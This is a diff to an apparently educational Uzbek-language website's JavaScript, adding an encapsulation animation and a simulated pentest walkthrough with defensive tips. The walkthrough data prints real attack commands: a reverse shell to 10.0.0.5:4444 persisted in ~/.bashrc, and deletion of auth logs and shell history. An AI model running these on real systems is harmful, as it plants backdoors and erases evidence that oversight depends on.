@@ -33,6 +33,16 @@ document.addEventListener('DOMContentLoaded', () => {
     if (document.querySelector('.tarmoq')) {
         initTarmoqPage();
     }
+
+    // Encapsulation Logic
+    if (document.getElementById('class-person')) {
+        initEncapsulationPage();
+    }
+
+    // Pentest Demo Logic
+    if (document.getElementById('pentest-stage')) {
+        initPentestDemoPage();
+    }
 });
 
 /* --- Index Page Functions --- */
@@ -1003,4 +1013,304 @@ function initTarmoqPage() {
         document.removeEventListener('touchmove', onDrag);
         document.removeEventListener('touchend', stopDrag);
     }
+}
+
+/* --- Encapsulation Page Functions --- */
+function initEncapsulationPage() {
+    const ageValEl = document.getElementById('age-val');
+    const lockEl = document.getElementById('lock');
+    const shieldEl = document.getElementById('shield');
+    const logEl = document.getElementById('encap-log');
+    
+    let currentAge = 0;
+
+    function log(msg, type = 'neutral') {
+        logEl.innerHTML = msg;
+        logEl.style.borderColor = type === 'error' ? '#ef4444' : (type === 'success' ? '#10b981' : 'rgba(255,255,255,0.1)');
+        logEl.style.color = type === 'error' ? '#fca5a5' : (type === 'success' ? '#86efac' : '#cbd5e1');
+    }
+
+    function createArrow(startEl) {
+        const rect = startEl.getBoundingClientRect();
+        const arrow = document.createElement('div');
+        arrow.className = 'anim-arrow';
+        arrow.innerHTML = '<i class="bi bi-arrow-right" style="font-size: 2rem;"></i>';
+        arrow.style.left = (rect.right + 10) + 'px';
+        arrow.style.top = (rect.top + rect.height/2 - 16) + 'px';
+        document.body.appendChild(arrow);
+        return arrow;
+    }
+
+    function moveArrowTo(arrow, targetEl, color, onComplete) {
+        const rect = targetEl.getBoundingClientRect();
+        // Calculate target position (left side of target element)
+        const targetX = rect.left - 40; 
+        const targetY = rect.top + rect.height/2 - 16;
+
+        arrow.style.color = color;
+        
+        // Trigger reflow
+        arrow.offsetHeight; 
+
+        arrow.style.transform = `translate(${targetX - parseFloat(arrow.style.left)}px, ${targetY - parseFloat(arrow.style.top)}px)`;
+        
+        setTimeout(() => {
+            if(onComplete) onComplete();
+        }, 500);
+    }
+
+    // 1. Direct Access Attempt
+    document.getElementById('btn-direct').addEventListener('click', function() {
+        const btn = this;
+        const target = document.getElementById('member-age');
+        const arrow = createArrow(btn);
+
+        log("To'g'ridan-to'g'ri murojaat qilinmoqda...", "neutral");
+
+        moveArrowTo(arrow, target, '#ef4444', () => {
+            // Impact
+            shieldEl.classList.add('active');
+            lockEl.classList.add('shake');
+            arrow.innerHTML = '<i class="bi bi-x-circle-fill" style="font-size: 2rem;"></i>';
+            
+            log("<i class='bi bi-x-circle'></i> XATOLIK! 'age' o'zgaruvchisi private (maxfiy). Unga to'g'ridan-to'g'ri murojaat qilib bo'lmaydi.", "error");
+
+            setTimeout(() => {
+                shieldEl.classList.remove('active');
+                lockEl.classList.remove('shake');
+                arrow.remove();
+            }, 1500);
+        });
+    });
+
+    // 2. Setter (Valid)
+    document.getElementById('btn-setter-valid').addEventListener('click', function() {
+        const btn = this;
+        const method = document.getElementById('method-set');
+        const member = document.getElementById('member-age');
+        const arrow = createArrow(btn);
+
+        log("Public metod orqali murojaat qilinmoqda...", "neutral");
+
+        moveArrowTo(arrow, method, '#10b981', () => {
+            // Inside method
+            method.style.background = 'rgba(16, 185, 129, 0.2)';
+            
+            setTimeout(() => {
+                // Move to member
+                moveArrowTo(arrow, member, '#10b981', () => {
+                    lockEl.className = 'bi bi-unlock-fill lock-icon';
+                    lockEl.style.color = '#10b981';
+                    currentAge = 25;
+                    ageValEl.innerText = currentAge;
+                    log("<i class='bi bi-check-circle'></i> MUVAFFAQIYATLI! Public metod orqali qiymat o'zgartirildi.", "success");
+
+                    setTimeout(() => {
+                        lockEl.className = 'bi bi-lock-fill lock-icon';
+                        lockEl.style.color = '';
+                        method.style.background = '';
+                        arrow.remove();
+                    }, 1500);
+                });
+            }, 600);
+        });
+    });
+
+    // 3. Setter (Invalid)
+    document.getElementById('btn-setter-invalid').addEventListener('click', function() {
+        const btn = this;
+        const method = document.getElementById('method-set');
+        const arrow = createArrow(btn);
+
+        log("Validatsiya tekshirilmoqda...", "neutral");
+
+        moveArrowTo(arrow, method, '#f59e0b', () => {
+            method.style.background = 'rgba(239, 68, 68, 0.2)'; // Red flash
+            arrow.innerHTML = '<i class="bi bi-exclamation-triangle-fill" style="font-size: 2rem;"></i>';
+            
+            log("<i class='bi bi-shield-x'></i> BLOKLANDI! Yosh manfiy bo'lishi mumkin emas. Metod buni rad etdi.", "error");
+
+            setTimeout(() => {
+                method.style.background = '';
+                arrow.remove();
+            }, 1500);
+        });
+    });
+}
+
+/* --- Pentest Demo Page Functions --- */
+let pentestStep = 0;
+let pentestAutoPlayInterval = null;
+
+const pentestStepsData = [
+    { 
+        phase: "Reconnaissance (Ma'lumot yig'ish)", 
+        cmd: "whois 192.168.1.100", 
+        log: "Ma'lumotlar bazasidan nishon haqida ochiq ma'lumotlar yig'ilmoqda...",
+        result: "Domain: target.local\nOS: Linux\nStatus: Up",
+        defense: "Adminlar WHOIS ma'lumotlarini yashirishi (Privacy Protection) va ochiq manbalardagi ma'lumotlarni nazorat qilishi kerak.",
+        color: "neutral"
+    },
+    { 
+        phase: "Scanning (Skanerlash)", 
+        cmd: "nmap -sS -A 192.168.1.100", 
+        log: "Nishondagi ochiq portlar va zaif xizmatlar qidirilmoqda...",
+        result: "PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2\n80/tcp open  http    Apache httpd 2.4.18",
+        defense: "Firewall (Xavfsizlik devori) orqali faqat kerakli portlarni (80, 443) ochiq qoldirib, qolganlarini yopish kerak. IDS/IPS nmap skanini aniqlashi lozim.",
+        color: "scanned"
+    },
+    { 
+        phase: "Gaining Access (Tizimga kirish)", 
+        cmd: "msfconsole -x 'use exploit/linux/ssh/...' ", 
+        log: "Eskirgan SSH xizmatidagi zaiflik (Exploit) orqali tizimga hujum qilinmoqda...",
+        result: "Exploit successful!\nCommand shell session 1 opened.\nroot@target:~# ",
+        defense: "Tizim va xizmatlarni (masalan, SSH) doimiy ravishda yangilab (Update/Patch) turish va kuchli parollar o'rnatish shart.",
+        color: "hacked"
+    },
+    { 
+        phase: "Maintaining Access (Kirishni saqlash)", 
+        cmd: "echo 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' >> ~/.bashrc", 
+        log: "Tizimga qayta kirish uchun yashirin Orqa eshik (Backdoor) o'rnatilmoqda...",
+        result: "Backdoor installed successfully. Persistence established.",
+        defense: "Tizimdagi fayl o'zgarishlarini kuzatuvchi (FIM) dasturlar o'rnatish va tarmoqdagi noodatiy chiquvchi (Outbound) trafikni bloklash kerak.",
+        color: "hacked"
+    },
+    { 
+        phase: "Covering Tracks (Izlarni yo'qotish)", 
+        cmd: "rm -rf /var/log/auth.log && history -c", 
+        log: "Hujumchi o'z izlarini yashirish uchun tizim jurnallarini (Logs) o'chirmoqda...",
+        result: "Logs cleared. Bash history deleted. Connection closed.",
+        defense: "Jurnallarni (Logs) markazlashgan va o'zgartirib bo'lmaydigan tashqi serverga (SIEM/Syslog server) jo'natish tizimini yo'lga qo'yish zarur.",
+        color: "neutral"
+    }
+];
+
+function initPentestDemoPage() {
+    window.resetPentestSim = resetPentestSim;
+    window.togglePentestAutoPlay = togglePentestAutoPlay;
+    window.nextPentestStep = nextPentestStep;
+}
+
+function updatePentestDots(current) {
+    const dots = document.querySelectorAll('#pentest-dots .dot');
+    dots.forEach((d, i) => {
+        if (i <= current) d.classList.add('active');
+        else d.classList.remove('active');
+    });
+}
+
+function addTerminalLine(text, type = 'normal') {
+    const term = document.getElementById('terminal-output');
+    const div = document.createElement('div');
+    div.className = `term-line ${type}`;
+    div.innerText = text;
+    term.appendChild(div);
+    term.scrollTop = term.scrollHeight;
+}
+
+function typeTerminalLine(text, type = 'normal', callback) {
+    const term = document.getElementById('terminal-output');
+    const div = document.createElement('div');
+    div.className = `term-line ${type}`;
+    term.appendChild(div);
+    
+    let i = 0;
+    function typeChar() {
+        if (i < text.length) {
+            div.innerText += text.charAt(i);
+            i++;
+            term.scrollTop = term.scrollHeight;
+            setTimeout(typeChar, 30); // Typing speed
+        } else {
+            if (callback) callback();
+        }
+    }
+    typeChar();
+}
+
+function resetPentestSim() {
+    pentestStep = 0;
+    const packet = document.getElementById('pentest-packet');
+    const term = document.getElementById('terminal-output');
+    const tooltip = document.getElementById('defense-tooltip');
+    
+    packet.style.opacity = '0';
+    packet.style.left = '0';
+    packet.className = 'packet'; // Reset classes
+    tooltip.style.display = 'none';
+
+    term.innerHTML = `
+        <div class="term-line">System ready. Penetration testing framework loaded.</div>
+        <div class="term-line">Simulyatsiyani boshlash uchun "Keyingi" tugmasini bosing.</div>
+    `;
+
+    if (pentestAutoPlayInterval) {
+        clearInterval(pentestAutoPlayInterval);
+        pentestAutoPlayInterval = null;
+        document.getElementById('btn-pentest-auto').innerHTML = '<i class="bi bi-play-fill"></i> Avto';
+    }
+    updatePentestDots(-1);
+}
+
+function togglePentestAutoPlay() {
+    const btn = document.getElementById('btn-pentest-auto');
+    if (pentestAutoPlayInterval) {
+        clearInterval(pentestAutoPlayInterval);
+        pentestAutoPlayInterval = null;
+        btn.innerHTML = '<i class="bi bi-play-fill"></i> Avto';
+    } else {
+        nextPentestStep();
+        pentestAutoPlayInterval = setInterval(nextPentestStep, 5000); // 5 seconds per step for typing to finish
+        btn.innerHTML = '<i class="bi bi-pause-fill"></i> To\'xtatish';
+    }
+}
+
+function nextPentestStep() {
+    if (pentestStep >= pentestStepsData.length) {
+        resetPentestSim();
+        return;
+    }
+
+    const current = pentestStepsData[pentestStep];
+    const packet = document.getElementById('pentest-packet');
+    const tooltip = document.getElementById('defense-tooltip');
+    const defenseText = document.getElementById('defense-text');
+    
+    // Hide tooltip temporarily
+    tooltip.style.display = 'none';
+
+    // Update terminal
+    addTerminalLine(`[Bosqich ${pentestStep + 1}]: ${current.phase}`, 'success');
+    
+    // Disable buttons during typing
+    document.querySelector('.btn-next').disabled = true;
+
+    typeTerminalLine(current.cmd, 'cmd', () => {
+        addTerminalLine(current.log, 'normal');
+        
+        // Visual animation
+        packet.innerText = current.phase.split(' ')[0];
+        packet.style.opacity = '1';
+        packet.className = `packet ${current.color}`;
+        
+        packet.style.left = '10%';
+        setTimeout(() => { 
+            packet.style.left = '80%'; 
+            
+            // Show result in terminal after animation
+            setTimeout(() => {
+                const results = current.result.split('\n');
+                results.forEach(res => addTerminalLine(res, 'normal'));
+                
+                // Show defense tooltip
+                defenseText.innerText = current.defense;
+                tooltip.style.display = 'block';
+                
+                updatePentestDots(pentestStep);
+                pentestStep++;
+                document.querySelector('.btn-next').disabled = false;
+            }, 500);
+
+        }, 50);
+    });
 }
